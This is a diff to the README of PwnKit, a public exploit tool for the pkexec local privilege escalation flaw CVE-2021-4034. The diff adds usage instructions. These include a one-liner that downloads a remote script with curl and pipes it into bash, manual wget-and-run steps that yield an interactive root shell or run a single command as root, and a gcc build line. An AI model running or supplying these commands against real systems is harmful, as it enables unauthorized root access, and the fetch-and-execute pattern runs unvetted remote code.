@@ -4,17 +4,36 @@ Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation
 
 ## Usage
 
-Should work out of the box on Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.
+Should work out of the box on vulnerable Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.
+
+```bash
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+```
+
+### Manual
 
 ```bash
 wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
 chmod +x ./PwnKit
-./PwnKit
+./PwnKit # interactive shell
+./PwnKit 'id' # single command
+```
+
+### Build
+
+```bash
+gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 ```
 
 ## Example
 
-![](./imgs/example.png)
+### Vulnerable
+
+![](./imgs/exploit.png)
+
+### Patched
+
+![](./imgs/patched.png)
 
 ## Technical Details
 
